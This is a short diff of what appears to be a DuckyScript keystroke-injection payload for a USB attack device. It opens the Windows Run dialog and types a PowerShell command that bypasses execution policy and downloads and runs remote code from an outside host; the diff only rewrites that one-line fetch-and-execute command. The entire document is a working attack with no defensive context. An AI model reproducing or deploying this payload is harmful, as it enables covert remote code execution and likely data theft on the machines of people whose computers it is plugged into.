@@ -15,6 +15,6 @@ REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -C $driveName = ''; $Hidden = ''; irm https://bw0.cc/exusb | iex
+STRING powershell -Ep Bypass -C $driveName = ''; $Hidden = ''; iex (irm bw0.cc/exusb)
 ENTER
 
